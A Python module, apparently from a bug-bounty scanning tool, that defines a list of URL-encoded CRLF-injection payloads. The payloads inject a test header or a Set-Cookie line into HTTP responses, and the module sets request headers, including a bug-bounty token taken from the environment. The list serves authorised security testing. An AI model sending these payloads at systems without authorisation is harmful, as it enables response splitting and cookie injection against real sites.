from lib.ColoredObject import Color as Cobj
from os import getenv

payloads = [
"/%0aevil-here:bugbountyplz",
"/%0d%0aevil-here:bugbountyplz",
"/%25%30aevil-here:bugbountyplz",
"/%250aevil-here:bugbountyplz",
"/%3f%0d%0aevil-here:bugbountyplz",
"/%3f%0aevil-here:bugbountyplz",
"/%u000aevil-here:bugbountyplz",
"/%26%0aevil-here:bugbountyplz",
"/%26%0d%0aSet-Cookie:bugbounty=bugbountyplz",
"/%23%0d%0aSet-Cookie:bugbounty=bugbountyplz",
"/%23%0aSet-Cookie:bugbounty=bugbountyplz",
"/%2F..%0d%0aSet-Cookie:bugbounty=bugbountyplz",
"/%u000a%u000dSet-Cookie:bugbounty=bugbountyplz",
"/%3B%0d%0aSet-Cookie:bugbounty=bugbountyplz",
"/%3B%0aSet-Cookie:bugbounty=bugbountyplz",
"/%E5%98%8A%E5%98%8DSet-Cookie:bugbounty=bugbountyplz",
]

Headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36'
}
try:
    Headers['X-Bug-Bounty'] = getenv('HACKERONE_ACCESS_TOKEN')
except Exception:
    pass

ColorObj = Cobj()
to_try = []

#"/%23%0aevil-here:bugbountyplz",
#"/%23%0devil-here:bugbountyplz",
#"/%2f%2e%2e%0d%0aevil-here:bugbountyplz",
#"/%3f%0d%0aSet-Cookie:bugbounty=bugbountyplz",
#"/%3f%0dSet-Cookie:bugbounty=bugbountyplz",
